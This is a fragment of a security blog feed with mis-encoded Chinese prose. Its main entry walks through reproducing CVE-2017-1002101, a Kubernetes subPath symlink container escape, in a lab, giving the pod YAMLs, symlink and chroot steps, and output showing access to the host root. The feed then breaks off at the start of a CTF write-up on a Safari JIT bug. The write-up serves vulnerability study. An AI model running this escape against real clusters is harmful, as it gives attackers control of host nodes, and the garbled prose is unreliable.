    <content type="html"><![CDATA[<p>æ­äº†ä¸€æ™šä¸Šk8sâ€¦â€¦è„–å­ç–¼ï¼Œå¹¸äºæ­å¥½äº†ä¸ç„¶ç¡ä¸ç€è§‰äº†</p><span id="more"></span><p>åŸç†è§ğŸ‘‰<a href="https://cloud.tencent.com/developer/article/1889157">é€ƒé€¸é£äº‘å†èµ·</a>ï¼Œä¸å†™äº†</p><ul><li><strong>å½±å“ç‰ˆæœ¬</strong>ï¼šv1.3.xã€v1.4.xã€v1.5.xã€v1.6.xåŠä½äºv1.7.14ã€v1.8.9å’Œv1.9.4ç‰ˆæœ¬</li><li>åˆ©ç”¨æƒ…æ™¯ï¼š<ul><li>å­˜åœ¨Podå®‰å…¨ç­–ç•¥ï¼Œé™åˆ¶äº†æŒ‚è½½ç›®å½•</li><li>å…·æœ‰æŸå‘½åç©ºé—´ä¸‹Podçš„åˆ›å»ºåŠç›¸å…³æƒé™</li></ul></li></ul><h1 id="ç¯å¢ƒé…ç½®"><a href="#ç¯å¢ƒé…ç½®" class="headerlink" title="ç¯å¢ƒé…ç½®"></a>ç¯å¢ƒé…ç½®</h1><p>ubuntu18.04ä½¿ç”¨<a href="https://github.com/Metarget/metarget">metarget</a></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./metarget gadget install docker --version 18.03.1 --verbose</span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo ./metarget cnv install cve-2017-1002101 --domestic --verbose</span><br></code></pre></td></tr></table></figure><p><em><strong>ä¸èƒ½ç”¨rootï¼ä¸èƒ½ç”¨rootï¼ä¸èƒ½ç”¨rootï¼</strong></em></p><h2 id="çƒ­èº«ä¸€ä¸‹"><a href="#çƒ­èº«ä¸€ä¸‹" class="headerlink" title="çƒ­èº«ä¸€ä¸‹"></a>çƒ­èº«ä¸€ä¸‹</h2><p>æ— å®‰å…¨ç­–ç•¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl get podsecuritypolicy</span><br>No resources found.<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªpod</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">cve-2017-1002101</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">test</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28.4</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-string">&quot;864000&quot;</span>]<br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/test</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">test-vol</span><br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">test-vol</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/test</span><br>      <span class="hljs-attr">type:</span> <span class="hljs-string">DirectoryOrCreate</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl apply -f cve.yaml</span><br></code></pre></td></tr></table></figure><p><strong>è¦ç”¨1.28.4ï¼Œè€ç‰ˆæœ¬dockeræ‹‰å–ä¸äº†æ–°ç‰ˆæœ¬çš„é•œåƒ</strong></p><p>è¿›å…¥pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl <span class="hljs-built_in">exec</span> -it cve-2017-1002101 -- /bin/sh</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºç¬¦å·é“¾æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs shell">cd /test<br>ln -s ../../.. malicious_link<br>ls -l<br>total 0<br>lrwxrwxrwx    1 root     root             8 Apr 14 17:25 malicious_link -&gt; ../../..<br></code></pre></td></tr></table></figure><p>æœ¬æœºæŸ¥çœ‹ç¬¦å·é“¾æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">ls</span> -l /tmp/test/malicious_link</span><br>lrwxrwxrwx 1 root root 8 Apr 14 10:25 /tmp/test/malicious_link -&gt; ../../..<br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> &lt;&lt;<span class="hljs-string">EOF &gt; /here_i_am.txt</span></span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"><span class="hljs-string">Yeah!! I&#x27;m on the host&#x27;s root dir!!</span></span><br><span class="hljs-meta prompt_">&gt; </span><span class="language-bash"><span class="hljs-string">EOF</span></span><br><span class="hljs-meta prompt_">$ </span><span class="language-bash"><span class="hljs-built_in">cat</span> /tmp/test/malicious_link/here_i_am.txt</span><br>Yeah!! I&#x27;m on the host&#x27;s root dir!!<br></code></pre></td></tr></table></figure><p>å†è¿›å…¥pod</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /test/malicious_link/here_i_am.txt<br>cat: can&#x27;t open &#x27;/test/malicious_link/here_i_am.txt&#x27;: No such file or directory<br></code></pre></td></tr></table></figure><h2 id="æµ…è¯•ä¸€ä¸‹"><a href="#æµ…è¯•ä¸€ä¸‹" class="headerlink" title="æµ…è¯•ä¸€ä¸‹"></a>æµ…è¯•ä¸€ä¸‹</h2><p>ä½¿ç”¨subPathæŒ‚è½½malicious_linkï¼Œå†åˆ›å»ºä¸€ä¸ªpod</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">cve-2017-1002101</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">busybox</span><br>    <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28.4</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;sleep&quot;</span>, <span class="hljs-string">&quot;864000&quot;</span>]<br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/test</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">test-vol</span><br>      <span class="hljs-attr">subPath:</span> <span class="hljs-string">malicious_link</span><br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">test-vol</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/test</span><br>      <span class="hljs-attr">type:</span> <span class="hljs-string">Directory</span><br></code></pre></td></tr></table></figure><p>å†è¿›å…¥podï¼Œå¯ä»¥è¯»å–åˆ° &#x2F; ä¸‹çš„æ–‡ä»¶ï¼Œä¸”è¿™æ—¶å€™&#x2F;testå°±æ˜¯ä¸»æœºçš„æ ¹ç›®å½•</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell">cat /test/here_i_am.txt <br>Yeah!! I&#x27;m on the host&#x27;s root dir!!<br></code></pre></td></tr></table></figure><h2 id="çœŸçš„ç¯å¢ƒæ­å»º"><a href="#çœŸçš„ç¯å¢ƒæ­å»º" class="headerlink" title="çœŸçš„ç¯å¢ƒæ­å»º"></a>çœŸçš„ç¯å¢ƒæ­å»º</h2><p>åˆ›å»ºç­–ç•¥ï¼Œæ³¨æ„ç©ºæ ¼</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">extensions/v1beta1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">PodSecurityPolicy</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">privileged</span><br>  <span class="hljs-attr">annotations:</span><br>    <span class="hljs-attr">seccomp.security.alpha.kubernetes.io/allowedProfileNames:</span> <span class="hljs-string">&#x27;*&#x27;</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">privileged:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">allowPrivilegeEscalation:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">allowedCapabilities:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*&#x27;</span><br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-string">&#x27;*&#x27;</span><br>  <span class="hljs-attr">allowedHostPaths:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">pathPrefix:</span> <span class="hljs-string">/tmp/</span><br>  <span class="hljs-string">hostNetwork:true</span><br>  <span class="hljs-attr">hostPorts:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">min:</span> <span class="hljs-number">0</span><br>    <span class="hljs-attr">max:</span> <span class="hljs-number">65535</span><br>  <span class="hljs-attr">hostIPC:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">hostPID:</span> <span class="hljs-literal">true</span><br>  <span class="hljs-attr">runAsUser:</span><br>    <span class="hljs-attr">rule:</span> <span class="hljs-string">&#x27;RunAsAny&#x27;</span><br>  <span class="hljs-attr">seLinux:</span><br>    <span class="hljs-attr">rule:</span> <span class="hljs-string">&#x27;RunAsAny&#x27;</span><br>  <span class="hljs-attr">supplementalGroups:</span><br>    <span class="hljs-attr">rule:</span> <span class="hljs-string">&#x27;RunAsAny&#x27;</span><br>  <span class="hljs-attr">fsGroup:</span><br>    <span class="hljs-attr">rule:</span> <span class="hljs-string">&#x27;RunAsAny&#x27;</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl apply -f policy.yaml</span><br></code></pre></td></tr></table></figure><p>æ‰“é€šRBAC</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRole</span><br><span class="hljs-attr">metadata:</span><br> <span class="hljs-attr">name:</span> <span class="hljs-string">privileged-psp</span><br><span class="hljs-attr">rules:</span><br> <span class="hljs-bullet">-</span> <span class="hljs-attr">apiGroups:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">policy</span><br>   <span class="hljs-attr">resourceNames:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">privileged</span><br>   <span class="hljs-attr">resources:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">podsecuritypolicies</span><br>   <span class="hljs-attr">verbs:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-string">use</span><br><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">rbac.authorization.k8s.io/v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">RoleBinding</span><br><span class="hljs-attr">metadata:</span><br> <span class="hljs-attr">name:</span> <span class="hljs-string">kube-system-psp</span><br> <span class="hljs-attr">namespace:</span> <span class="hljs-string">kube-system</span><br><span class="hljs-attr">roleRef:</span><br> <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br> <span class="hljs-attr">kind:</span> <span class="hljs-string">ClusterRole</span><br> <span class="hljs-attr">name:</span> <span class="hljs-string">privileged-psp</span><br><span class="hljs-attr">subjects:</span><br> <span class="hljs-bullet">-</span> <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br>   <span class="hljs-attr">kind:</span> <span class="hljs-string">Group</span><br>   <span class="hljs-attr">name:</span> <span class="hljs-string">system:nodes</span><br> <span class="hljs-bullet">-</span> <span class="hljs-attr">apiGroup:</span> <span class="hljs-string">rbac.authorization.k8s.io</span><br>   <span class="hljs-attr">kind:</span> <span class="hljs-string">Group</span><br>   <span class="hljs-attr">name:</span> <span class="hljs-string">system:serviceaccounts:kube-system</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl apply -f rbac.yaml --validate=<span class="hljs-literal">false</span></span><br></code></pre></td></tr></table></figure><p>æ‰‹åŠ¨ç¼–è¾‘APIServeré…ç½®æ–‡ä»¶</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo vim /etc/kubernetes/manifests/kube-apiserver.yaml</span><br><br><br>    - --admission-control=Initializers,NamespaceLifecycle,LimitRanger,ServiceAccount,DefaultStorageClass,DefaultTolerationSeconds,NodeRestriction,ResourceQuota,PodSecurityPolicy<br><br><br></code></pre></td></tr></table></figure><p>é‡å¯KubeletæœåŠ¡</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo service kubelet restart</span><br></code></pre></td></tr></table></figure><p>å°è¯•æŒ‚è½½å®¿ä¸»æœºæ ¹ç›®å½•ï¼Œå¤±è´¥</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">test</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28.4</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">test</span><br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/test</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;sleep&quot;</span>]<br>    <span class="hljs-attr">args:</span> [<span class="hljs-string">&quot;10000&quot;</span>]<br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl apply -f try.yaml</span> <br>Error from server (Forbidden): error when creating &quot;try.yaml&quot;: pods &quot;test&quot; is forbidden: unable to validate against any pod security policy: [spec.volumes[0].hostPath.pathPrefix: Invalid value: &quot;/&quot;: is not allowed to be used]<br></code></pre></td></tr></table></figure><p>å°è¯•ç›¸å¯¹è·¯å¾„ç»•è¿‡ï¼Œå¤±è´¥</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">test</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28.4</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">test</span><br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/test</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;sleep&quot;</span>]<br>    <span class="hljs-attr">args:</span> [<span class="hljs-string">&quot;10000&quot;</span>]<br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/../</span><br></code></pre></td></tr></table></figure><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl apply -f try.yaml</span> <br>The Pod &quot;test&quot; is invalid: <br>* spec.volumes[0].hostPath.path: Invalid value: &quot;/tmp/../&quot;: must not contain &#x27;..&#x27;<br>* spec.containers[0].volumeMounts[0].name: Not found: &quot;vuln-vol&quot;<br></code></pre></td></tr></table></figure><h1 id="æ¼æ´åˆ©ç”¨"><a href="#æ¼æ´åˆ©ç”¨" class="headerlink" title="æ¼æ´åˆ©ç”¨"></a>æ¼æ´åˆ©ç”¨</h1><p>æ­¥éª¤ï¼š</p><ul><li>åˆ›å»ºä¸€ä¸ªPodï¼ŒhostPathæŒ‚è½½&#x2F;tmp&#x2F;test</li><li>ä¸Šä¸€ä¸ªPodä¸­ï¼Œåœ¨å®¿ä¸»æœº&#x2F;tmp&#x2F;testç›®å½•ä¸‹åˆ›å»ºæŒ‡å‘&#x2F;çš„ç¬¦å·é“¾æ¥xxx</li><li>åˆ›å»ºç¬¬äºŒä¸ªPodï¼ŒhostPathæŒ‚è½½&#x2F;tmp&#x2F;testï¼ŒsubPathæŒ‚è½½xxx</li><li>ç¬¬äºŒä¸ªPodçš„shellä¸­ï¼Œchrootåˆ°xxxï¼Œå®ç°å®¹å™¨é€ƒé€¸</li></ul><p>ç¬¬ä¸€ä¸ªpod</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">stage-1-container</span><br><span class="hljs-attr">spec:</span><br> <span class="hljs-attr">containers:</span><br> <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28.4</span><br>   <span class="hljs-attr">name:</span> <span class="hljs-string">stage-1-container</span><br>   <span class="hljs-attr">volumeMounts:</span><br>   <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/vuln</span><br>     <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>   <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;sleep&quot;</span>]<br>   <span class="hljs-attr">args:</span> [<span class="hljs-string">&quot;10000&quot;</span>]<br> <span class="hljs-attr">volumes:</span><br> <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>   <span class="hljs-attr">hostPath:</span><br>     <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/test</span><br></code></pre></td></tr></table></figure><p>åœ¨ç¬¬ä¸€ä¸ªpodä¸­åˆ›å»ºç¬¦å·é“¾æ¥</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl <span class="hljs-built_in">exec</span> -it stage-1-container -- <span class="hljs-built_in">ln</span> -s / /vuln/xxx</span><br></code></pre></td></tr></table></figure><p>åˆ›å»ºç¬¬äºŒä¸ªpod</p><figure class="highlight yaml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs yaml"><span class="hljs-attr">apiVersion:</span> <span class="hljs-string">v1</span><br><span class="hljs-attr">kind:</span> <span class="hljs-string">Pod</span><br><span class="hljs-attr">metadata:</span><br>  <span class="hljs-attr">name:</span> <span class="hljs-string">stage-2-container</span><br><span class="hljs-attr">spec:</span><br>  <span class="hljs-attr">containers:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">image:</span> <span class="hljs-string">busybox:1.28.4</span><br>    <span class="hljs-attr">name:</span> <span class="hljs-string">stage-2-container</span><br>    <span class="hljs-attr">volumeMounts:</span><br>    <span class="hljs-bullet">-</span> <span class="hljs-attr">mountPath:</span> <span class="hljs-string">/vuln</span><br>      <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>      <span class="hljs-attr">subPath:</span> <span class="hljs-string">xxx</span><br>    <span class="hljs-attr">command:</span> [<span class="hljs-string">&quot;sleep&quot;</span>]<br>    <span class="hljs-attr">args:</span> [<span class="hljs-string">&quot;10000&quot;</span>]<br>  <span class="hljs-attr">volumes:</span><br>  <span class="hljs-bullet">-</span> <span class="hljs-attr">name:</span> <span class="hljs-string">vuln-vol</span><br>    <span class="hljs-attr">hostPath:</span><br>      <span class="hljs-attr">path:</span> <span class="hljs-string">/tmp/test</span><br></code></pre></td></tr></table></figure><p>è¿›å…¥ç¬¬äºŒä¸ªpod chrootï¼Œé€ƒé€¸æˆåŠŸ</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs shell"><span class="hljs-meta prompt_">$ </span><span class="language-bash">sudo kubectl <span class="hljs-built_in">exec</span> -it stage-2-container -- /bin/sh</span><br>cat /etc/hostname<br>stage-2-container<br>chroot vuln<br>cat /etc/hostname<br>ubuntu<br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CVEs</category>
      
      <category>K8s</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cve</tag>
      
      <tag>k8s</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>2024 é˜¿é‡Œäº‘CTF BadApple wp</title>
    <link href="/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/"/>
    <url>/2024/04/09/%E9%98%BF%E9%87%8C%E4%BA%91badapple/</url>
    
    <content type="html"><![CDATA[<p>å¤´ç–¼â€¦â€¦èƒŒç–¼â€¦â€¦å¤±çœ â€¦â€¦å¥½å¥½å¥½</p><span id="more"></span><p><a href="https://blog.exodusintel.com/2023/12/11/safari-hold-still-for-nan-minutes/">Safari, Hold Still for NaN Minutes!</a></p><p><em>ç–¯ç‹‚describeå¿˜è®°çœ‹diffï¼Œä»–tmdæ³¨é‡Šæ‰äº†å•Šï¼ï¼ï¼</em></p><h1 id="NaN-boxing"><a href="#NaN-boxing" class="headerlink" title="NaN-boxing"></a>NaN-boxing</h1><p>å¯¹è±¡ç¼–ç </p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-comment">/*</span><br><span class="hljs-comment"> *     Pointer &#123;  0000:PPPP:PPPP:PPPP</span><br><span class="hljs-comment"> *              / 0002:****:****:****</span><br><span class="hljs-comment"> *     Double  &#123;         ...</span><br><span class="hljs-comment"> *              \ FFFC:****:****:****</span><br><span class="hljs-comment"> *     Integer &#123;  FFFE:0000:IIII:IIII</span><br><span class="hljs-comment"> */</span><br></code></pre></td></tr></table></figure><ul><li>æŒ‡é’ˆã€å¸ƒå°”å€¼ç­‰ï¼šé«˜16ä½ä¸º0</li><li>åŒç²¾åº¦æµ®ç‚¹æ•°ï¼šé«˜16ä½2~fffcï¼Œé€šè¿‡æ‰€æœ‰doubleåŠ 1&lt;&lt;49ç¼–ç </li><li>32ä½æ•´æ•°ï¼šé«˜16ä½fffe</li></ul><h1 id="BUG"><a href="#BUG" class="headerlink" title="BUG"></a>BUG</h1><p>æ¼æ´æºäºDFG JITå’ŒFTL JITä¼˜åŒ–å’Œç¼–è¯‘ä»æµ®ç‚¹æ•°ç»„è·å–å…ƒç´ çš„æ–¹å¼</p><h2 id="snippet1"><a href="#snippet1" class="headerlink" 